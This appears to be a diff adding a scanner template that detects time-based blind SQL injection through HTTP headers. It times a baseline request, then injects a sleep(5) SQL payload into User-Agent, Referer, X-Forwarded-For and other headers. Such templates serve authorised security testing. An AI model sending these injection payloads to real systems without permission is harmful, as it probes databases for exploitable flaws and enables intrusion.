@@ -1,0 +1,85 @@
+http:
+- extractors:
+  - dsl:
+    - duration
+    internal: true
+    name: baseline_duration
+    type: dsl
+  matchers:
+  - internal: true
+    status:
+    - 200
+    - 301
+    - 302
+    - 403
+    - 404
+    - 500
+    type: status
+  raw:
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: en-US,en;q=0.5
+
+    Connection: close
+
+    '
+- matchers:
+  - dsl:
+    - duration >= 5
+    type: dsl
+  - dsl:
+    - duration >= 4 + baseline_duration
+    type: dsl
+  matchers-condition: and
+  raw:
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: '' or sleep(5)-- -
+
+    Referer: '' or sleep(5)-- -
+
+    X-Forwarded-For: '' or sleep(5)-- -
+
+    X-Client-IP: '' or sleep(5)-- -
+
+    X-Remote-IP: '' or sleep(5)-- -
+
+    X-Remote-Addr: '' or sleep(5)-- -
+
+    X-Originating-IP: '' or sleep(5)-- -
+
+    X-Forwarded-Host: '' or sleep(5)-- -
+
+    X-Host: '' or sleep(5)-- -
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: en-US,en;q=0.5
+
+    Connection: close
+
+    '
+id: header-blind-sql-injection
+info:
+  author: geeknik
+  description: 'Time-based blind SQL injection via HTTP headers. Sends a baseline
+    request
+
+    first, then injects sleep payloads into headers commonly logged or processed
+
+    in database queries. Compares response times to reduce false positives from
+
+    slow servers or network latency.
+
+    '
+  name: Header Blind SQL Injection
+  severity: high
+  tags: blind-sqli
